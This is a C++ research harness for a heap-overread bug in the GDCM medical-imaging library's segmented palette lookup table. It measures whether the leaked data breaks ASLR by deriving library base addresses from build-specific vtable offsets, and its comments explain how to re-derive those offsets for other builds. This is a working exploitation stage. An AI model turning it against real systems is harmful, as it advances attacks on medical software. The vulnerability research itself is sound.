// Finding 3 ASLR-defeat measurement harness.
//
// Exercises the ORIGINAL, already-confirmed Finding 3 primitive (see
// harnesses/finding03_sentinel.cpp, harnesses/finding03_propagation.cpp,
// generators/finding-03.py): the unchecked, attacker-controlled segment
// length field in
// Source/MediaStorageAndFileFormat/gdcmSegmentedPaletteColorLookupTable.cxx's
// DiscreteSegment constructor,
//
//   DiscreteSegment(const EntryType* first)
//       : Segment<EntryType>(first, first+2+*(first+1)) {}
//
// which lets std::copy(first+2, first+2+declared_length, ...) read past the
// end of the Segmented Palette Color LUT Data element's heap buffer. This
// harness generalizes that to arbitrary declared length and measures (a)
// how far the resulting heap overread can go before the process stops
// producing usable output (parse-time exception vs. a hard crash reading
// unmapped memory), and (b) whether any word in the overread window is a
// pointer-shaped value that lands inside a real mapped region of this
// process -- classified against its own fresh /proc/self/maps -- which
// would defeat ASLR for that mapping.
//
// A PRIOR version of this file (and of generators/finding-03-leak.py)
// targeted a different, REFUTED mechanism: it assumed
// LookupTable::SetLUT's "(void)length;" meant the true palette size was
// ignored, so a segment producing zero real entries would let the N-entry
// copy loop read a std::vector's reserve()d-but-never-written capacity
// (glibc tcache safe-linking bait). That is wrong -- the same function
// contains `gdcm_assert(Internal->Length[type]*(BitSample/8) == length)`
// a few lines later, and gdcm_assert(cond) is
// `if (!(cond)) throw gdcm::Exception(...)` UNCONDITIONALLY (see
// Source/Common/gdcmException.h), not gated on NDEBUG. So palette.size()
// must equal the descriptor length N exactly, and a zero-entry segment
// throws before any read happens. See generators/finding-03-leak.py for
// the corrected mechanism writeup.
//
// This harness prints only: small integer counts, region classifications,
// and the specific reconstructed candidate pointers -- the minimum needed
// to state whether ASLR was defeated and against which mapping. It does
// not dump raw heap contents. See SAFETY.md and the boundaries this task
// was given.
#include "gdcmImageReader.h"
#include "gdcmImageApplyLookupTable.h"
#include "gdcmTag.h"
#include "gdcmByteValue.h"
#include "gdcmDataElement.h"

#include <cstdint>
#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <iostream>
#include <algorithm>

#include <dlfcn.h>
#include <unistd.h>

namespace {

struct MapRegion {
    uint64_t start;
    uint64_t end;
    std::string perms;
    std::string path; // may be empty, or a pseudo-name like [heap], [stack]
};

std::vector<MapRegion> ReadSelfMaps()
{
    std::vector<MapRegion> regions;
    std::ifstream f("/proc/self/maps");
    std::string line;
    while (std::getline(f, line)) {
        uint64_t start = 0, end = 0;
        char perms[8] = {0};
        unsigned long offset = 0;
        char dev[16] = {0};
        unsigned long inode = 0;
        int consumed = 0;
        int n = std::sscanf(line.c_str(), "%lx-%lx %7s %lx %15s %lu %n",
                             &start, &end, perms, &offset, dev, &inode, &consumed);
        if (n < 6) continue;
        MapRegion r;
        r.start = start;
        r.end = end;
        r.perms = perms;
        while (consumed < (int)line.size() && line[consumed] == ' ') ++consumed;
        if (consumed < (int)line.size()) r.path = line.substr(consumed);
        regions.push_back(r);
    }
    return regions;
}

// Classify an address against this process's own memory map. Exact match
// (no shifting/reconstruction guesswork -- this is a literal heap
// overread, so a pointer-shaped word found there is either a real pointer
// value or it isn't).
std::string Classify(const std::vector<MapRegion> &maps, uint64_t addr,
                      uint64_t *out_region_start)
{
    for (const auto &r : maps) {
        if (addr >= r.start && addr < r.end) {
            if (out_region_start) *out_region_start = r.start;
            if (!r.path.empty()) {
                if (r.path.front() == '[') return r.path;
                size_t slash = r.path.find_last_of('/');
                return slash == std::string::npos ? r.path : r.path.substr(slash + 1);
            }
            return r.perms.find('w') != std::string::npos ? "anon-rw" : "anon";
        }
    }
    return "";
}

// True for anything that is not a bare heap/stack/anonymous mapping --
// i.e. a named module (a .so, the harness executable itself, [vdso], etc)
// whose base is a meaningful ASLR-defeat target.
bool IsModuleClass(const std::string &cls)
{
    return !cls.empty() && cls != "[heap]" && cls != "[stack]" &&
           cls != "anon" && cls != "anon-rw";
}

// Known fixed offset of a recognised, real C++ vtable within its module,
// used to DERIVE that module's load base from a leaked pointer, instead of
// asking the process about its own /proc/self/maps or dladdr (which would
// be circular -- any process can read its own maps; that proves nothing
// about the leak). Independent verification against maps/dladdr happens
// separately, AFTER the derivation, as a check -- see main().
//
// These two offsets are SPECIFIC TO THIS BUILD of GDCM v3.2.6 on
// the tested Ubuntu 24.04/gcc 13.3/x86-64 build (the unsanitized
// vulnerable/none/release profile). They were obtained empirically, not
// guessed:
//   1. Run once, get a confirmed hit's leaked pointer and its dladdr
//      fbase (module load base) for cross-reference only.
//   2. offset_candidate = leaked_pointer - fbase.
//   3. `nm -D --defined-only <module>.so | sort`, then find the nearest
//      defined symbol at or below offset_candidate. In both cases here it
//      landed EXACTLY on a mangled vtable symbol (_ZTV...) plus 0x10 --
//      the Itanium C++ ABI's vptr-to-vtable-symbol offset (the vptr
//      stored in an object skips the offset-to-top and RTTI slots at the
//      start of the vtable), confirming these are real, stable vtable
//      addresses, not coincidental matches.
// A real attacker targeting a different GDCM build, compiler, or distro
// would need to re-derive the equivalent offset for THAT build (e.g. from
// a copy of the target's own .so, which is routinely available for a
// distro package) -- this offset does not travel across builds, and this
// harness does not claim it does. Use --offset/FINDING03_LEAK_OFFSET
// below to supply a different build's offset without editing this file.
struct KnownVtable {
    const char *module_substr;
    uint64_t offset;
    const char *symbol;
};
static const KnownVtable kKnownVtables[] = {
    { "libgdcmDSED.so", 0x106208,
      "vtable for gdcm::ByteValue (_ZTVN4gdcm9ByteValueE + 0x10)" },
    { "libgdcmMSFF.so", 0x2a5390,
      "vtable for gdcm::SegmentedPaletteColorLookupTable "
      "(_ZTVN4gdcm32SegmentedPaletteColorLookupTableE + 0x10)" },
};

struct Candidate {
    char channel;      // 'R','G','B'
    unsigned entry;     // LUT entry index (== pixel index for that word)
    uint64_t value;
    uint64_t region_start;
    std::string cls;
};

// Physical (real) entry count and declared descriptor length for one
// channel, read straight from the file -- no reliance on the CLI.
struct ChannelInfo {
    unsigned n_declared = 0;   // descriptor length N (0028,1101/1102/1103)
    unsigned n_real = 0;       // words actually present in the segment payload
};

bool ReadChannelInfo(gdcm::File &file, uint16_t desc_tag, uint16_t data_tag, ChannelInfo &out)
{
    const gdcm::DataSet &ds = file.GetDataSet();
    gdcm::Tag dtag(0x0028, desc_tag);
    if (!ds.FindDataElement(dtag)) return false;
    const gdcm::DataElement &deDesc = ds.GetDataElement(dtag);
    const gdcm::ByteValue *bvDesc = deDesc.GetByteValue();
    if (!bvDesc || bvDesc->GetLength() < 2) return false;
    uint16_t n_declared = 0;
    std::memcpy(&n_declared, bvDesc->GetPointer(), 2);
    out.n_declared = n_declared;

    gdcm::Tag ltag(0x0028, data_tag);
    if (!ds.FindDataElement(ltag)) return false;
    const gdcm::DataElement &deData = ds.GetDataElement(ltag);
    const gdcm::ByteValue *bvData = deData.GetByteValue();
    if (!bvData) return false;
    const size_t seg_words = bvData->GetLength() / 2;
    // Single DiscreteSegment: [opcode][declared_len] + real payload words.
    out.n_real = seg_words >= 2 ? (unsigned)(seg_words - 2) : 0;
    return true;
}

} // namespace

int main(int argc, char *argv[])
{
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0]
                   << " <dicom_file> [--offset 0xHEX] [--verbose-candidates]\n"
                   << "  --offset overrides the built-in known vtable offset "
                      "(or set FINDING03_LEAK_OFFSET)\n"
                   << "  --verbose-candidates prints every classified pointer window\n";
        return 2;
    }

    bool have_override = false;
    bool verbose_candidates = false;
    uint64_t override_offset = 0;
    for (int i = 2; i < argc; ++i) {
        if (std::string(argv[i]) == "--offset") {
            if (i + 1 >= argc) {
                std::cerr << "--offset requires a hexadecimal value\n";
                return 2;
            }
            override_offset = std::strtoull(argv[i + 1], nullptr, 16);
            have_override = true;
            ++i;
        } else if (std::string(argv[i]) == "--verbose-candidates") {
            verbose_candidates = true;
        } else {
            std::cerr << "unknown argument: " << argv[i] << "\n";
            return 2;
        }
    }
    if (!have_override) {
        const char *env = std::getenv("FINDING03_LEAK_OFFSET");
        if (env && *env) {
            override_offset = std::strtoull(env, nullptr, 16);
            have_override = true;
        }
    }

    gdcm::ImageReader reader;
    reader.SetFileName(argv[1]);
    bool read_ok = false;
    try {
        read_ok = reader.Read();
    } catch (const std::exception &e) {
        std::cout << "GDCM_EXCEPTION during Read(): " << e.what() << "\n";
        std::cout << "ASLR_DEFEAT_NOT_ACHIEVED reason=parse_time_exception\n";
        return 4;
    }
    if (!read_ok) {
        std::cerr << "ImageReader::Read() failed\n";
        std::cout << "ASLR_DEFEAT_NOT_ACHIEVED reason=read_failed\n";
        return 2;
    }

    ChannelInfo chan[3];
    const uint16_t desc_tags[3] = {0x1101, 0x1102, 0x1103};
    const uint16_t data_tags[3] = {0x1221, 0x1222, 0x1223};
    const char chan_letter[3] = {'R', 'G', 'B'};
    for (int c = 0; c < 3; ++c) {
        ReadChannelInfo(reader.GetFile(), desc_tags[c], data_tags[c], chan[c]);
    }

    unsigned max_oob_bytes_requested = 0;
    for (int c = 0; c < 3; ++c) {
        unsigned oob_words = chan[c].n_declared > chan[c].n_real
                                  ? chan[c].n_declared - chan[c].n_real : 0;
        max_oob_bytes_requested = std::max(max_oob_bytes_requested, oob_words * 2);
        std::cout << "channel=" << chan_letter[c]
                  << " n_declared=" << chan[c].n_declared
                  << " n_real=" << chan[c].n_real
                  << " oob_bytes_requested=" << (oob_words * 2) << "\n";
    }
    std::cout << "max_oob_bytes_requested=" << max_oob_bytes_requested << "\n";

    gdcm::ImageApplyLookupTable lutfilt;
    lutfilt.SetInput(reader.GetImage());
    bool apply_ok = false;
    try {
        apply_ok = lutfilt.Apply();
    } catch (const std::exception &e) {
        std::cout << "GDCM_EXCEPTION during Apply(): " << e.what() << "\n";
        std::cout << "ASLR_DEFEAT_NOT_ACHIEVED reason=apply_time_exception\n";
        return 5;
    }
    if (!apply_ok) {
        std::cerr << "ImageApplyLookupTable::Apply() failed\n";
        std::cout << "ASLR_DEFEAT_NOT_ACHIEVED reason=apply_failed\n";
        return 3;
    }

    const gdcm::Pixmap &out = lutfilt.PixmapToPixmapFilter::GetOutput();
    const unsigned samples = out.GetPixelFormat().GetSamplesPerPixel();
    if (samples != 3) {
        std::cerr << "unexpected samples_per_pixel=" << samples << " (expected 3 after LUT apply)\n";
        std::cout << "ASLR_DEFEAT_NOT_ACHIEVED reason=unexpected_sample_count\n";
        return 3;
    }
    const unsigned long buflen = out.GetBufferLength();
    std::vector<char> buffer(buflen);
    if (!out.GetBuffer(buffer.data())) {
        std::cerr << "GetBuffer() failed\n";
        std::cout << "ASLR_DEFEAT_NOT_ACHIEVED reason=getbuffer_failed\n";
        return 3;
    }
    const uint16_t *words = reinterpret_cast<const uint16_t *>(buffer.data());
    const size_t n_words = buflen / 2;
    const size_t n_pixels = n_words / 3;

    std::cout << "decoded_pixels=" << n_pixels << "\n";
    if (max_oob_bytes_requested > 0) {
        std::cout << "OOB_READ_SURVIVED bytes=" << max_oob_bytes_requested << "\n";
    }

    // Ground truth: this process's own memory map, read fresh right before
    // classification (matches the state pointers were leaked from).
    std::vector<MapRegion> maps = ReadSelfMaps();

    auto word_at = [&](unsigned pixel, unsigned channel) -> uint16_t {
        size_t idx = (size_t)pixel * 3 + channel; // RED=0 GREEN=1 BLUE=2
        return idx < n_words ? words[idx] : 0;
    };

    auto reconstruct = [&](unsigned channel, unsigned p) -> uint64_t {
        uint64_t v = 0;
        v |= (uint64_t)word_at(p + 0, channel) << 0;
        v |= (uint64_t)word_at(p + 1, channel) << 16;
        v |= (uint64_t)word_at(p + 2, channel) << 32;
        v |= (uint64_t)word_at(p + 3, channel) << 48;
        return v;
    };

    std::vector<Candidate> hits;
    size_t windows_examined = 0;
    size_t class_heap = 0, class_lib = 0, class_stack = 0, class_anon = 0, class_none = 0;

    for (int c = 0; c < 3; ++c) {
        unsigned n = chan[c].n_declared;
        unsigned k_real = chan[c].n_real;
        if (n == 0 || n > n_pixels || n < k_real + 4) continue; // need >=4 OOB words for a window
        unsigned lo = k_real;
        unsigned hi = n - 4; // last p with p..p+3 all < n
        for (unsigned p = lo; p <= hi; ++p) {
            ++windows_examined;
            uint64_t v = reconstruct(c, p);
            if (v == 0) continue;
            uint64_t region_start = 0;
            std::string cls = Classify(maps, v, &region_start);
            if (cls.empty()) { ++class_none; continue; }
            if (cls == "[heap]") ++class_heap;
            else if (cls == "[stack]") ++class_stack;
            else if (IsModuleClass(cls)) ++class_lib;
            else ++class_anon;

            Candidate cand;
            cand.channel = chan_letter[c];
            cand.entry = p;
            cand.value = v;
            cand.region_start = region_start;
            cand.cls = cls;
            hits.push_back(cand);
        }
    }

    std::cout << "windows_examined=" << windows_examined
              << " candidates_classified=" << hits.size()
              << " class_heap=" << class_heap
              << " class_lib_or_exe=" << class_lib
              << " class_stack=" << class_stack
              << " class_anon=" << class_anon
              << " class_unclassified=" << class_none << "\n";

    // Full scan disclosure: every window in every leak channel's declared-
    // but-absent entry range is examined below -- there is no hardcoded
    // "look at entry N" step. Whether a hit's entry index is nonetheless
    // STABLE run-to-run is answered empirically, per distinct hit, further
    // down (not assumed).
    std::cout << "scan_mode=full_window_scan (every offset in each channel's "
                 "OOB entry range is checked; nothing is assumed present at "
                 "a fixed index)\n";

    // Full candidate output is available for research, but the default keeps
    // the transcript focused on the decisive derivation below.
    if (verbose_candidates) {
        for (const auto &h : hits) {
            std::cout << "candidate channel=" << h.channel
                      << " entry=" << h.entry
                      << " value=0x" << std::hex << h.value << std::dec
                      << " class=" << h.cls << "\n";
        }
    }

    // ---- Derive, then verify -- never look up and call it "leaked" ----
    // A module's base must be DERIVED from the leaked pointer plus a
    // KNOWN, independently-obtained offset (kKnownVtables above). Reading
    // our own /proc/self/maps or calling dladdr tells us only where we
    // ourselves are loaded -- any process can do that, and printing it as
    // the "leaked" result would be circular. Those two are used below
    // ONLY to check the derivation, never to produce the reported base.
    //
    // Distinct (module, value) pairs are reported once each. The default
    // prints a bounded sample of their entry indexes plus the total count;
    // --verbose-candidates retains every classified window.
    struct DistinctHit {
        std::string cls;
        uint64_t value;
        std::vector<std::string> locations; // "R:46" etc -- the stability answer
    };
    std::vector<DistinctHit> distinct;
    for (const auto &h : hits) {
        if (!IsModuleClass(h.cls)) continue;
        bool merged = false;
        for (auto &d : distinct) {
            if (d.cls == h.cls && d.value == h.value) {
                d.locations.push_back(std::string(1, h.channel) + ":" + std::to_string(h.entry));
                merged = true;
                break;
            }
        }
        if (!merged) {
            DistinctHit d;
            d.cls = h.cls;
            d.value = h.value;
            d.locations.push_back(std::string(1, h.channel) + ":" + std::to_string(h.entry));
            distinct.push_back(d);
        }
    }

    bool any_confirmed = false;
    bool any_mismatch = false;
    uint64_t first_confirmed_base = 0;
    std::string first_confirmed_module;

    for (const auto &d : distinct) {
        uint64_t offset_used = 0;
        std::string symbol;
        bool have_offset = false;
        if (have_override) {
            offset_used = override_offset;
            symbol = "user-provided --offset/FINDING03_LEAK_OFFSET override";
            have_offset = true;
        } else {
            for (const auto &kv : kKnownVtables) {
                if (d.cls.find(kv.module_substr) != std::string::npos) {
                    offset_used = kv.offset;
                    symbol = kv.symbol;
                    have_offset = true;
                    break;
                }
            }
        }

        const size_t shown = std::min<size_t>(d.locations.size(), 12);
        std::cout << "module_hit class=" << d.cls << " found_at=[";
        for (size_t i = 0; i < shown; ++i) {
            std::cout << d.locations[i] << (i + 1 < shown ? "," : "");
        }
        if (shown < d.locations.size()) std::cout << ",...";
        std::cout << "] location_count=" << d.locations.size() << "\n";

        if (!have_offset) {
            std::cout << "  value=0x" << std::hex << d.value << std::dec
                       << " -- no known vtable offset for this module; cannot "
                          "derive a base for it (see --offset)\n";
            continue;
        }

        const uint64_t derived_base = d.value - offset_used;

        // Independent ground truth, used ONLY to check the derivation above.
        uint64_t truth_base = 0;
        std::string truth_source = "unavailable";
        Dl_info info;
        if (dladdr(reinterpret_cast<void *>(d.value), &info) && info.dli_fbase) {
            truth_base = (uint64_t)info.dli_fbase;
            truth_source = "dladdr";
        } else {
            uint64_t region_start = 0;
            Classify(maps, d.value, &region_start);
            truth_base = region_start;
            truth_source = "/proc/self/maps region start";
        }
        const bool agree = truth_base != 0 && derived_base == truth_base;
        if (agree) {
            any_confirmed = true;
            if (first_confirmed_module.empty()) {
                first_confirmed_base = derived_base;
                first_confirmed_module = d.cls;
            }
        } else {
            any_mismatch = true;
        }

        std::cout << "  vtable_symbol=" << symbol << " known_offset=0x" << std::hex << offset_used
                   << std::dec << (have_override ? " (override)" : " (built-in table)") << "\n";
        std::cout << "  leaked_pointer=0x" << std::hex << d.value << std::dec << "\n";
        std::cout << "  derived_base=0x" << std::hex << derived_base << std::dec << "\n";
        std::cout << "  truth_base=0x" << std::hex << truth_base << std::dec
                   << " (via " << truth_source << ", used for verification only)\n";
        std::cout << "  agreement=" << (agree ? "yes" : "no") << "\n";
    }

    if (any_confirmed) {
        std::cout << "ASLR_DEFEAT_CONFIRMED base=0x" << std::hex << first_confirmed_base
                   << std::dec << " module=" << first_confirmed_module
                   << " verified_against_maps=yes\n";
        return 0;
    }
    if (any_mismatch) {
        // A derivation was attempted and did NOT match ground truth -- per
        // instructions, this is a loud failure, not something to paper
        // over by falling back to the looked-up value.
        std::cout << "ASLR_DEFEAT_NOT_ACHIEVED reason=derived_base_mismatch\n";
        return 6;
    }
    if (!distinct.empty()) {
        std::cout << "ASLR_DEFEAT_NOT_ACHIEVED reason=no_known_vtable_offset_for_any_hit\n";
        return 1;
    }
    std::cout << "ASLR_DEFEAT_NOT_ACHIEVED reason=no_candidate_word_matched_a_mapped_region\n";
    return 1;
}
